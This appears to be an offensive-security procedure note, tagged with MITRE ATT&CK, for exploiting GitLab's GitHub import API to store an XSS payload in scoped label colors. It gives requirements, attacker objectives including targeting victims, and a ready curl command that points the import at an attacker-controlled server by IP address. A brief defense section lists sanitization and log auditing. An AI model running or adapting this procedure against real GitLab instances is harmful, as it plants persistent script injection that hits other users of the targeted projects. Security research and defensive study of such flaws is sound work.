---
tags:
  - gitlab-api
  - import
  - xss-injection
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/gitlab-github-import-curl]]'
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:55:20.971Z'
sub_techniques: []
id: 635022f2-a861-4dff-b9e1-5b67fd145218
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Import-Malicious-Repository-via-API

## Summary

This procedure uses the GitLab API to import a malicious GitHub repository, injecting the XSS payload into scoped labels and storing it persistently in the target project.

## Description

GitLab's /api/v4/import/github endpoint fetches repository data from a specified GitHub hostname. By pointing to a dummy server, the import pulls in labels with malicious colors, exploiting the lack of validation for scoped labels. This bypasses a prior fix that only handled non-scoped labels, leading to HTML/JS injection.

## Requirements

1. Valid $GL_TOKEN environment variable
2. Dummy GitHub server running with malicious label
3. Target GitLab namespace (e.g., group)
4. Fake GitHub repo ID and token

## Defense

Defensive measures and detection strategies:

- Sanitize label colors on import (e.g., restrict to hex values)
- Block custom hostnames in import requests
- Audit API logs for import endpoints with unusual parameters

## Objectives

1. Trigger import to store XSS payload
2. Place repository in attacker's namespace for targeting victims
3. Confirm payload persistence without errors

## Instructions

### Step 1: Prepare Import Payload

**Context**: Construct JSON with details to point to the malicious server.

Set variables: repo_id=523303538, target_namespace=yvvdwf-group-a, new_name=xss-on-label-color, github_hostname=http://51.75.74.52:11211, personal_access_token=ghp_...

### Step 2: Execute Import Command

**Context**: Send POST request to initiate import.

**Command** ([[commands/gitlab-github-import-curl]]):
```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: $GL_TOKEN" --data '{
 "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
 "repo_id": "523303538",
 "target_namespace": "yvvdwf-group-a",
 "new_name": "xss-on-label-color",
 "github_hostname": "http://51.75.74.52:11211"
}'
```

> Explanation: The -kv flags enable verbose output and skip SSL issues; headers authenticate and set JSON type; data includes import params. Expected output: {"id":<job_id>,"status":"started"}. Monitor job status via API if needed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/gitlab-github-import-curl]]

## Tools Used

- [[tools/curl]]

## Tags

- [[gitlab-api]]
- [[import]]
- [[xss-injection]]
